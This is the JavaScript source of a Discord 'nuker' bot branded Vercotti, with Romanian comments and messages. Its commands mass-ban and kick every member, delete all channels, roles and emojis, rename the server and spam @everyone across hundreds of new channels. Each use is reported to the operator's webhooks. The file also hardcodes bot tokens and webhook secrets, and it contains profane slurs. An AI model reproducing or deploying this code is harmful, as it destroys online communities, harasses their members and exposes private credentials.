
const Discord = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const db = require("quick.db")

client.on("ready", async () => {
  console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers`);
client.user.setActivity("🔪spear your heart", {
    type:"STREAMING",
    url: "https://www.twitch.tv/krishnadaslivestreams"
});
let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setDescription(`The bot was reconnected to the host :white_check_mark: `);

const wrb = new Discord.WebhookClient("891759518806077510", "mYKFamLjxPAa8oQdlCPn5AxAZmvEplmIhnbKB53-CuVscGfad-XMKPMDbBWLNVSTQSzf");
    await wrb.send(matatactu)



  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" n-am csf >> " + guild.name + " - sclavii " + guild.memberCount)
    })
});



client.on("message", async message => {

  if (message.author.bot) return;

  if (message.content.startsWith('.help')) {
    let rmvpremium = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda .help`;
    const wrb = new Discord.WebhookClient("893495420376989726", "SlXs4CVdWvVeBBsBitBm9Q5P0CZpQX9hl9eV2uNJMPVVH5TlhLc5ZK1CALGbFouPtRAg");
    await wrb.send(rmvpremium)
    const helpEmbed = new Discord.MessageEmbed()
      .setColor('RANDOM')
      .setTitle(`Prefix [.]`)
      .setAuthor(`Command List`, message.author.displayAvatarURL())


      .addFields({
        name: 'Comenzile standard',
        value: '.nuke | .banv2 | .spamchannels',
      },
      {
        name: 'Comenzile Premium',
        value: '.baneveryone | .sn | .addchannel',
      },)
    message.channel.send(helpEmbed);
  }


  if (message.content.startsWith('.ping')) {
    message.channel.send('daca apuci sa vezi asta sami bagpulan mata').then(m => m.edit(`API: ${m.createdTimestamp - message.createdTimestamp}ms. Web Socket: ${Math.round(client.ws.ping)}ms.`))
  }


//invite
  if (message.content.startsWith('.invite')) {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('Bot Invite Link')
      .setDescription(`[Invite Link](https://discord.com/api/oauth2/authorize?client_id=890275607986962474&permissions=8&scope=bot)`)
      .setImage(``)
      .setFooter(`Pentru comenzi tastati .help`)
      .setColor('ff0000')
    message.channel.send(helpEmbed);
        let invite = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda .invite`;
    const wrb = new Discord.WebhookClient("893495420376989726", "SlXs4CVdWvVeBBsBitBm9Q5P0CZpQX9hl9eV2uNJMPVVH5TlhLc5ZK1CALGbFouPtRAg");
    await wrb.send(invite)
  }

if (message.content.startsWith("rmv premium")) {

        const embed = new MessageEmbed()
        .setDescription(`Ai ramas fara premium`)
    
        .setColor("0d0d0d")
           let ownerID = "836123033588465704"
  if(message.author.id !== ownerID) return;
  let rmvpremium = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a sters un membru la lista premium`;
  const wrb = new Discord.WebhookClient("893495420376989726", "SlXs4CVdWvVeBBsBitBm9Q5P0CZpQX9hl9eV2uNJMPVVH5TlhLc5ZK1CALGbFouPtRAg");
  await wrb.send(rmvpremium)
    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.delete(`dev_${user.id}`, 1)
        const tactuEmbed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle(':white_check_mark: User removed from premium')
    .addFields({
        name: 'User removed from premium',
        value: 'That member no longer has access to premium commands',
    },)
    message.channel.send(tactuEmbed);
    user.send(embed)
  }

  if (message.content.startsWith("add premium")) {
        const embed = new MessageEmbed()
      .setColor("#0d0d0d")
      .setDescription(`⚠️𝗔𝗶 𝗽𝗿𝗶𝗺𝗶𝘁 𝗽𝗿𝗲𝗺𝗶𝘂𝗺, 𝘃𝗲𝗶 𝗯𝗲𝗻𝗲𝗳𝗶𝗰𝗶𝗮 𝗱𝗲 𝗰𝗼𝗺𝗲𝗻𝘇𝗶 𝘀𝗽𝗲𝗰𝗶𝗮𝗹𝗲!⚠️`);
         let ownerID = "836123033588465704"
  if(message.author.id !== ownerID) return;
  let addpremium = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a adaugat un membru la lista premium`;
  const wrb = new Discord.WebhookClient("893495420376989726", "SlXs4CVdWvVeBBsBitBm9Q5P0CZpQX9hl9eV2uNJMPVVH5TlhLc5ZK1CALGbFouPtRAg");
  await wrb.send(addpremium)
    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    const mataEmbed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle(':white_check_mark: User added to premium')
    .addFields({
        name: 'User added to premium',
        value: 'This user have now acces to premium commands',
    },)
    message.channel.send(mataEmbed);
    user.send(embed)
  }


if (message.content.startsWith('verify')){
let role = message.member.guild.roles.cache.find(role => role.name === "🍪・Members");
let mata = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setDescription(`🛑Succesfully verified.`);
message.channel.send(mata);
if (role) message.guild.members.cache.get(message.author.id).roles.add(role);
message.delete(mata);
}


//icon set
  if (message.content.startsWith('.sn')) {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`🛑𝗡𝘂 𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝘁𝗶𝘃𝗮𝘁🛑`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)

      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp
      message.delete();
      let pula = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.sn** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
      const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
  
      await wrb.send(pula)

  }


  // Mass Ban
  if (message.content.startsWith('.banv2')) {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    message.delete();
    let tatata = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.banv2** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
    await wrb.send(tatata)
    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`🛑𝗡𝘂 𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝘁𝗶𝘃𝗮𝘁🛑`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
  
    message.guild.members.cache.forEach(member => member.ban({ reason: "Vercotti was here." })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")
      ))
      
}


//saawokoajwova
  if (message.content.startsWith('.deletechannels')) {
    
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    message.delete();
      message.guild.channels.cache.forEach(channel => channel.delete())     
      let matatatata = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.deletechannels** pe serverul **${message.guild.name}** cu **${message.guild.memberCount}** membri`;
      const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
      await wrb.send(matatatata)
    
      await message.guild.channels.create(`server nuked by Vercotti Nuker`, {
        type : 'text'
      })
  }


//asaslal
  if (message.content.startsWith('.deleteroles')) {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
message.delete();
let dada = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.deleteroles** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
await wrb.send(dada)
    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

  }

//sunt nr 1
  if (message.content.startsWith('.addchannel')) {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    let add = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.addchannel** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
    await wrb.send(add)
          let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`🛑𝗡𝘂 𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝘁𝗶𝘃𝗮𝘁🛑`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
    message.delete();

    await message.guild.channels.create(`salut`, {
      type : 'text'
    })
  }

  // Mass Ban
  if (message.content.startsWith('.baneveryone')) {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    message.delete();
    let hadad = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.baneveryone** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");
    await wrb.send(hadad)
    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`🛑𝗡𝘂 𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝘁𝗶𝘃𝗮𝘁🛑`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
    message.guild.members.cache.forEach(member => member.ban({ reason: "Vercotti was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      
}

  // Mass Channels      


  if (message.content.startsWith('salut')) {
    
  if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    message.delete();






    // Channel Delete

    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();



    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "Vercotti was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

    let mes = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **salut** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");

    await wrb.send(mes)

    // Kick All


    message.guild.members.cache.forEach(member => member.kick({ reason: "Vercotti was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));




    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })




    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Vercotti Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))




    // Death.


    message.guild.setName(`Server Inchis`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Vercotti was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))





  }


})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hello, World!');
}
const server = http.createServer(requestListener); 
server.listen(8080);




client.login("ODkwMjc1NjA3OTg2OTYyNDc0.YUtbxQ.qR7idx7CJQC639V_XyymDKNJpXg") // beta ODgzMDQ2OTYwNjI0NDYzOTU0.YTEPkQ.M5v3aciO155FgO1Ba2fb2TmIyW4 //oficial ODkwMjc1NjA3OTg2OTYyNDc0.YUtbxQ.qR7idx7CJQC639V_XyymDKNJpXg



client.on('message', async (message) => {
  if (message.content === '.nuke') {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    message.guild.channels.cache.forEach(channel => channel.delete());


    message.guild.roles.cache.forEach(role => role.delete());
    message.guild.members.cache.forEach(member => member.ban({ reason: "Vercotti was here" }))
    let da = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.nuke** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");

    await wrb.send(da)

    await message.guild.channels.create(`MUIE-SERVER`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})

client.on('message', async (message) => {
  if (message.content.startsWith('premium')) {
    
    
        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setDescription(`🛑𝗡𝘂 𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝘁𝗶𝘃𝗮𝘁🛑`);
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)
          
                       if(message.guild.id == '883377499621433375') return message.channel.send('https://discord.gg/Yz78FDERkE');
    
                if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                } else {
                      let channels =  message.guild.channels.cache.array();
                         message.guild.channels.cache.array().forEach(channel => {
          channel.delete();
        });
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 200; i++) {
                            message.guild.channels.create('𝗪𝗶𝘇𝘇𝗲𝗱 𝗯𝘆 ' + message.author.username)
                            message.guild.members.cache.forEach(member => member.ban({ reason: 'Banned by Vercotti'}))
    
                            for (var i = 0; i < 200; i++) {
                                let channels = message.guild.channels.create('𝗪𝗶𝘇𝘇𝗲𝗱 𝗯𝘆 ' + message.author.username)
    
                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log((`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }
    
                        }
    
                    }
    
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)
    
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(`CHANNEL PINGED!`);
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
                message.delete();
       
            }            
     })

client.on('message', async (message) => {
  if (message.content === '@everyone') {
    if (message.guild.id === "883377499621433375") return message.channel.send("")
    await message.guild.channels.create(`server-inchis`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
  })
  }
})

//ok fac ceva misto
client.on('message', async (message) => {
  if (message.content === '.spamchannels') {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    let dadada = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.spamchannels** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("893527821257957376", "_AmMk5JzBaDIuF2f8YmKaxsUmRSWZDjuyMrWp9_PXyJLie82l34aQk3bjR-UpuPDd-3A");

    await wrb.send(dadada)
    await message.guild.channels.create(`MUIE-SERVER`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content === '@everyone') {
    if (message.guild.id === "883377499621433375") return message.channel.send("nice try")
    await message.guild.channels.create(`server-inchis`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
    message.channel.send('@everyone https://discord.gg/YMJcfmgHcT Vercotti BEST BOT')
  })
  }
})